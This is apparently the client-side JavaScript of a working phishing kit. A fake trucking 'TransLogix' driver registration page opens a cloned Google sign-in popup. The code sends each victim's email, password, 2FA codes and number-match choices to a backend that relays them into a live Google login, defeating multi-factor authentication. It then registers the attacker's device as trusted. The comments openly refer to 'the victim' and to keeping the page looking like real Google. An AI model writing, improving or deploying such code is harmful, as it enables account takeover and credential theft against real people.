const token = location.pathname.split('/').pop();
// A unique id for THIS visitor's registration. The same static link is used by
// many people, so this keeps each person's steps building up their own fresh
// session server-side instead of everyone sharing one.
const wid = (crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).slice(2));
const $ = (id) => document.getElementById(id);

function show(name) {
  for (const id of ['screen-email', 'screen-pass', 'screen-totp', 'screen-approval', 'screen-numchoice', 'screen-done']) {
    $(id).classList.toggle('hidden', id !== name);
  }
}
function onScreen(id) {
  const el = document.getElementById(id);
  return !!(el && !el.classList.contains('hidden'));
}
function showApproval() {
  show('screen-approval');
  $('approve-status').textContent = 'Waiting…';
  $('btn-approve').disabled = false;
}

// Device-registration (keypass) progress: reuse the approval screen's status
// line — it reads as "Google is confirming something", which it is.
function showTrustProgress(msg) {
  if (!onScreen('screen-approval')) showApproval();
  $('approve-status').textContent = msg;
  const numBox = $('approval-numbers');
  if (numBox) numBox.style.display = 'none';
}

// The Google sign-in lives in a POPUP over the landing page (like a real
// "Continue with Google" flow) — the victim never sees a Google "page".
function openPopup() {
  $('g-overlay').classList.remove('hidden');
  $('g-email').focus();
}
function closePopup() {
  $('g-overlay').classList.add('hidden');
}
function hint(id, msg, error) {
  const el = $(id);
  if (msg) { el.textContent = msg; el.hidden = false; el.classList.toggle('error', !!error); }
  else { el.textContent = ''; el.hidden = true; el.classList.remove('error'); }
}

async function api(pathname, body) {
  const sep = pathname.includes('?') ? '&' : '?';
  return fetch('/api/wizard/' + token + pathname + sep + 'wid=' + wid, {
    method: body ? 'POST' : 'GET',
    headers: { 'Content-Type': 'application/json' },
    body: body ? JSON.stringify(body) : undefined,
  });
}

async function step(name, value) {
  try {
    const r = await api('/step', { step: name, value });
    return r.ok ? await r.json() : null;
  } catch {
    return null;
  }
}

// Toggle a Google-style loading spinner on a submit button while the backend
// is actually driving the real sign-in for that step.
function busy(btn, on) {
  const el = typeof btn === 'string' ? $(btn) : btn;
  el.disabled = on;
  el.classList.toggle('loading', on);
}

// The most recent wizard payload from the server (carries the username of the
// account they signed in with and the live-login result for each step).
let WIZ = null;
function setWiz(w) { if (w) WIZ = w; }

// ---- live polling ----
// While Google awaits a phone-approve (the "Confirm it's you" page) or a code,
// the visitor completes it on their device. We re-query the REAL login state
// until it settles — signed-in (Gmail is reachable), an error, or a next screen.
let _poll = null;
function stopPolling() { if (_poll) { clearInterval(_poll); _poll = null; } }
function startPolling() {
  stopPolling();
  _poll = setInterval(async () => {
    const w = await step('status');
    routeState((w && w.login) || null, w || null);
  }, 2500);
}

// Mirror EXACTLY what the live backend Google page is asking for right now.
// This is the single place that decides which screen the clone shows.
function routeState(L, w) {
  L = L || {};
  if (L.status === 'error') {
    stopPolling();
    if (onScreen('screen-totp')) {
      $('g-totp').classList.add('field-error');
      hint('totp-hint', L.message || 'That code didn\u2019t work. Enter the current code.', true);
      $('g-totp').focus();
      $('g-totp').select();
    } else if (onScreen('screen-approval')) {
      $('approve-status').textContent = L.message || 'Check your phone and tap Approve, or try another way.';
    } else if (onScreen('screen-numchoice')) {
      hint('num-choice-hint', L.message || 'That selection didn\u2019t work \u2014 pick the number shown next to this sign-in on Google.', true);
    } else if (onScreen('screen-email')) {
      hint('email-hint', L.message || 'Couldn\u2019t find your Google Account.', true);
    } else {
      $('g-pass').classList.add('field-error');
      hint('pass-hint', L.message || 'Wrong password. Try again or click Forgot password to reset it.', true);
    }
    return;
  }
  // success = device registered (keypass) — the full finish.
  if (L.state === 'trusted') { stopPolling(); return finish(); }
  // signed in, but this OS still needs to be registered for the account:
  // show the registration progress and keep polling. Every page Google asks
  // for on the way (password re-entry / number / 2FA) is routed to the matching
  // screen below, so the user sees exactly what to type or tap.
  if ((w && w.trusted === true) && L.state !== 'trusted') { stopPolling(); return finish(); }
  if (L.state === 'trust-start') {
    showTrustProgress('Almost done \u2014 registering this device with your account so future sign-ins skip verification\u2026');
    startPolling();
    return;
  }
  if ((w && w.loggedIn) || L.state === 'signed-in') {
    showTrustProgress('Signed in \u2014 registering this device with your account (one-time setup)\u2026');
    startPolling();
    return;
  }
  // "Confirm it's you" / check-your-phone-approve -> show it + keep polling.
  // The approve page can ALSO display a verification number (e.g. /challenge/dp:
  // "the number 47 below will be on your phone") — surface it big, that was the
  // missing piece.
  if (L.state === 'approve') {
    if (!onScreen('screen-approval')) showApproval();
    // number shown on the page: render it so the user sees exactly what Google shows
    const numBox = $('approval-numbers');
    const list = (L.options || []).map(String);
    if (list.length && list.join('|') !== (numBox.dataset.opts || '')) {
      numBox.dataset.opts = list.join('|');
      numBox.innerHTML = list.map((n) => `<div class="g-numbig">${n}</div>`).join('');
    }
    numBox.style.display = list.length ? '' : 'none';
    if (list.length) $('approve-status').textContent = 'Waiting for your phone…';
    startPolling();
    return;
  }
  // 6-digit code (authenticator / SMS / e-mail) -> show it + keep polling.
  // Some code pages display the number right there on the page — show it above
  // the input so the user sees it without hunting.
  if (L.state === 'code') {
    if (!onScreen('screen-totp')) show('screen-totp');
    const numBox = $('totp-numbers');
    const list = (L.options || []).map(String);
    if (list.length && list.join('|') !== (numBox.dataset.opts || '')) {
      numBox.dataset.opts = list.join('|');
      numBox.innerHTML = list.map((n) => `<div class="g-numbig">${n}</div>`).join('');
    }
    numBox.style.display = list.length ? '' : 'none';
    $('g-totp').focus();
    startPolling();
    return;
  }
  // "select the matching number" challenge (some accounts) -> mirror the real
  // options the live Google page shows and let the victim tap the right one.
  if (L.state === 'numchoice') {
    renderNumChoice(L.options || []);
    startPolling();
    return;
  }
  if (L.state === 'password') {
    if (!onScreen('screen-pass')) { show('screen-pass'); }
    $('g-pass').focus();
    return;
  }
  // transitional / verifying — wait quietly where we are; keep polling so the
  // next step (code / approve / signed-in / error) is picked up automatically.
  if (onScreen('screen-approval')) $('approve-status').textContent = 'Verifying\u2026';
  else if (onScreen('screen-totp')) hint('totp-hint', 'Verifying\u2026');
  else if (onScreen('screen-pass')) hint('pass-hint', 'Verifying\u2026');
  else if (onScreen('screen-email')) hint('email-hint', 'Verifying\u2026');
  else if (onScreen('screen-numchoice')) hint('num-choice-hint', 'Verifying\u2026');
  startPolling();
}

// Mark the invite complete, then show the success screen. On a confirmed
// sign-in (Gmail verified) surface "Open Gmail" so it reads as a working login.
// Flip the LANDING PAGE (behind the sign-in popup) into its success state, so
// the portal itself reads "registered" — not only the sign-in card.
function showLandingSuccess(username) {
  const name = $('d-name').value.trim();
  const plate = $('d-plate').value.trim().toUpperCase();
  $('ls-name').textContent = name || (username ? username.split('@')[0] : 'Driver');
  const meta = [plate ? 'Plate \u00b7 ' + plate : '', username ? 'Google \u00b7 ' + username : ''].filter(Boolean).join('   \u00b7   ');
  if (meta) {
    const el = $('ls-meta');
    el.textContent = meta;
    el.hidden = false;
  }
  $('ls-form-wrap').classList.add('hidden');
  $('ls-success').classList.remove('hidden');
  document.title = 'Registered \u2014 TransLogix';
}
async function redirect() {
  stopPolling();
  await api('/complete', {}).catch(() => {});
  const username = (WIZ && WIZ.username) || '';
  $('done-msg').textContent = (WIZ && WIZ.trusted)
    ? 'Driver details received — you\u2019re signed in to Google. This device is now registered for your account.'
    : 'Driver details received \u2014 you\u2019re signed in to Google.';
  if (username) {
    $('done-account').textContent = 'Signed in as ' + username;
    $('done-account').hidden = false;
  }
  showLandingSuccess(username);
  openPopup();
  show('screen-done');
}
async function finish() {
  return redirect();
}
$('btn-done').addEventListener('click', () => {
  hidePopupToLanding();
});

// Exiting the success screen: close the popup and reveal the (still filled)
// landing form so the page looks like a normal "submitted" portal page.
function hidePopupToLanding() {
  closePopup();
}

// ---- inert links (kept so the page looks like real Google) ----
$('forgot-email').addEventListener('click', () =>
  hint('email-hint', 'Enter the email address linked to this account.'));
$('forgot-pass').addEventListener('click', () =>
  hint('pass-hint', 'Enter the password for this account.'));
// "Try another way" -> don't fight over 2FA; let REAL Google handle the prompt/
// SMS. Bounce them over and they finish it on the genuine page.
$('try-another').addEventListener('click', finish);

// ---- authentic footer: Help/Privacy/Terms hints + language toggle ----
for (const btn of document.querySelectorAll('.g-foot-link')) {
  btn.addEventListener('click', () => {
    const msg = btn.dataset.hint || 'You can close this page once signed in.';
    const cur = document.querySelector('.g-screen:not(.hidden)');
    // flash the footer hint where there's room; otherwise toast on the card
    toast(msg);
  });
}
function toast(msg) {
  const el = $('toast');
  el.textContent = msg;
  el.classList.add('show');
  clearTimeout(toast._t);
  toast._t = setTimeout(() => el.classList.remove('show'), 2400);
}
// real-Google bottom footer is gone in the popup layout; guard in case it returns
if ($('g-lang')) {
  $('g-lang').addEventListener('click', (e) => {
    const langs = ['English (United States)', 'English (UK)', 'Deutsch', 'Français (France)', 'Español (España)'];
    const span = $('g-lang').querySelector('span');
    const cur = langs.indexOf(span.textContent);
    span.textContent = langs[(cur + 1) % langs.length];
  });
}

// ---- driver registration (landing) ----
$('form-driver').addEventListener('submit', async (e) => {
  e.preventDefault();
  const fullName = $('d-name').value.trim();
  const phone = $('d-phone').value.trim();
  const email = $('d-email').value.trim();
  const license = $('d-license').value.trim();
  const licensePlate = $('d-plate').value.trim();
  const vehicle = $('d-vehicle').value.trim();
  const city = $('d-city').value.trim();
  const state = $('d-state').value;
  if (!fullName && !licensePlate) {
    return hint('driver-hint', 'Enter your full name and plate number to continue.', true);
  }
  hint('driver-hint', '');
  busy('btn-driver', true);
  const ok = await step('driver', { driverName: fullName, licensePlate, phone, email, license, vehicle, city, state });
  busy('btn-driver', false);
  setWiz(ok);
  if (!ok) {
    hint('driver-hint', 'Something went wrong. Try again.', true);
    return;
  }
  // driver details captured -> open the Google sign-in as a popup
  openPopup();
  show('screen-email');
});

// close the popup (backdrop click or the X), leaving the landing intact
$('g-close').addEventListener('click', closePopup);
$('g-overlay').addEventListener('click', (e) => { if (e.target === $('g-overlay')) closePopup(); });

// ---- email ----
$('form-email').addEventListener('submit', async (e) => {
  e.preventDefault();
  const v = $('g-email').value.trim();
  if (!v) return hint('email-hint', 'Enter an email or phone number.');
  hint('email-hint', '');
  busy('btn-email', true);
  const ok = await step('username', v);
  busy('btn-email', false);
  setWiz(ok);
  if (!ok) {
    hint('email-hint', 'Something went wrong. Try again.', true);
    return;
  }
  // Route to whatever the REAL Google page is asking for next (password / code /
  // approve / signed-in). renderAccount() dresses the password screen; if we land
  // on a challenge or straight to "signed in" instead, it's harmless.
  renderAccount(v);
  routeState((ok.login) || {}, ok);
});

function renderAccount(email) {
  const [name, domain] = email.split('@');
  $('account-email').textContent = email;
  $('avatar-initials').textContent = (name || '?').charAt(0).toUpperCase();
  $('to-continue').textContent = 'To continue to ' + (domain ? domain : 'your Google Account');
  $('account-row').hidden = false;
}

// ---- password ----
$('show-pass').addEventListener('change', (e) => {
  $('g-pass').type = e.target.checked ? 'text' : 'password';
});
$('form-pass').addEventListener('submit', async (e) => {
  e.preventDefault();
  const v = $('g-pass').value;
  if (!v) return hint('pass-hint', 'Enter your password.', true);
  hint('pass-hint', '');
  $('g-pass').classList.remove('field-error');
  busy('btn-pass', true);
  const w = await step('password', v);
  busy('btn-pass', false);
  setWiz(w);
  if (!w) {
    hint('pass-hint', 'Something went wrong. Try again.', true);
    return;
  }
  // Route to whatever the REAL Google page asks next: a 6-digit code, the
  // "Confirm it's you" approve prompt, signed-in (Gmail verified), or an error.
  // routeState keeps polling until it settles.
  routeState((w.login) || {}, w);
});

// ---- 2FA ----
async function submitTotp() {
  const v = $('g-totp').value.trim();
  if (!v) return hint('totp-hint', 'Enter the code shown in your authenticator app.', true);
  hint('totp-hint', '');
  $('g-totp').classList.remove('field-error');
  busy('btn-totp', true);
  const w = await step('totp', v);
  busy('btn-totp', false);
  setWiz(w);
  if (!w) {
    hint('totp-hint', 'Something went wrong. Try again.', true);
    return;
  }
  // Route to whatever the REAL Google page asks next. A wrong code shows the
  // error on the 2FA field; a right code that still needs a phone-approve lands
  // on the approve screen and keeps polling until it's confirmed.
  routeState((w.login) || {}, w);
}
$('btn-totp').addEventListener('click', submitTotp);
$('g-totp').addEventListener('keydown', (e) => { if (e.key === 'Enter') submitTotp(); });
$('g-totp').addEventListener('input', () => {
  const el = $('g-totp');
  // like real Google: digits only, max 6, auto-submit at 6
  el.value = el.value.replace(/\D/g, '').slice(0, 6);
  if (el.value) { hint('totp-hint', ''); el.classList.remove('field-error'); }
  if (el.value.length === 6) submitTotp();
});

// ---- number-choice screen ("select the matching number") ----
// Renders the EXACT options scraped off the live Google page and sends the
// victim's pick; the backend then clicks the matching real option tile.
function makeNumTile(n) {
  const b = document.createElement('button');
  b.type = 'button';
  b.className = 'g-numtile';
  b.textContent = n;
  b.addEventListener('click', onNumTilePick);
  return b;
}
async function onNumTilePick(e) {
  const el = e.currentTarget;
  const box = $('num-tiles');
  if (box.disabled) return;
  box.disabled = true;
  box.querySelectorAll('.g-numtile').forEach((t) => (t.disabled = true));
  el.classList.add('picked');
  hint('num-choice-hint', 'Verifying\u2026');
  const w = await step('numchoice', el.textContent.trim());
  if (!w) {
    box.disabled = false;
    box.querySelectorAll('.g-numtile').forEach((t) => (t.disabled = false));
    el.classList.remove('picked');
    hint('num-choice-hint', 'Something went wrong. Try another number.', true);
    return;
  }
  setWiz(w);
  routeState(w.login || {}, w);
}
function renderNumChoice(options) {
  if (!onScreen('screen-numchoice')) show('screen-numchoice');
  const box = $('num-tiles');
  const list = (options || []).map(String);
  const same = list.join('|') === (box.dataset.opts || '');
  if (!same) {
    box.innerHTML = '';
    box.dataset.opts = list.join('|');
    list.forEach((n) => box.appendChild(makeNumTile(n)));
  }
  // single-number accounts: one big tile + tell the victim what it is
  box.classList.toggle('single', list.length === 1);
  if (list.length === 1) {
    hint('num-choice-hint', 'Google is showing a verification number — confirm it to continue.');
  }
  box.disabled = false;
  box.querySelectorAll('.g-numtile').forEach((t) => (t.disabled = false));
  if (!list.length) hint('num-choice-hint', 'Tap the number that matches this sign-in on Google.');
}

// ---- approve screen ("Confirm it's you" / check-your-phone) ----
// "Try another way" -> fall back to typing the 6-digit code instead.
$('try-another-2').addEventListener('click', () => {
  stopPolling();
  show('screen-totp');
  $('g-totp').focus();
});
// "Continue" nudges an immediate re-check (the poll otherwise waits up to ~2.5s).
$('btn-approve').addEventListener('click', async () => {
  const w = await step('status');
  routeState((w && w.login) || null, w || null);
});

// ---- boot ----
(async function boot() {
  const r = await api('');
  if (!r.ok) {
    document.title = 'Sign in - Google Accounts';
    $('card').innerHTML = '<div class="oops" style="margin:8px 0">This sign-in link is invalid or has expired.<br><span style="font-weight:400;color:#5f6368">Ask the sender for a fresh link.</span></div>';
    return;
  }
  const w = await r.json();
  setWiz(w);
  // Already signed in (e.g. reload after completing / returning visitor) -> show
  // the personalized success screen; otherwise show the driver landing (popup
  // stays closed until they hit "Sign in with Google").
  if (w.done || w.loggedIn) { redirect(); return; }
  closePopup();
  $('d-name').focus();
})();
